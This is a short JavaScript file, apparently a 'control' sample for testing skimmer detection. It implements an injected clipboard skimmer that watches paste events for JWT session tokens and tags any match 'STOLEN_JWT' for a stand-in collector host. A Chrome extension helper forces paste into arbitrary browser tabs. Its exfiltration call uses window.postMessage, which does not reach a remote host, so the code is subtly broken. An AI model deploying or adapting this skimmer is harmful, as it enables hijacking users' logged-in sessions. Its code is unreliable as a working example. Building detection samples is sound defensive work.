// Clipboard JWT interceptor control: injected skimmer that forwards pasted
// session tokens to a collector host. True capture flow, no benign backend.
const SAMPLE_JWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
document.addEventListener('paste', (e) => {
  const pasted = e.clipboardData.getData('text');
  if (/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(pasted)) {
    window.postMessage({type: 'STOLEN_JWT', token: pasted}, 'https://collector.evil-backend.io');
  }
});
function skimTab(tabId) {
  chrome.scripting.executeScript({target: {tabId}, func: () => document.execCommand('paste')});
}
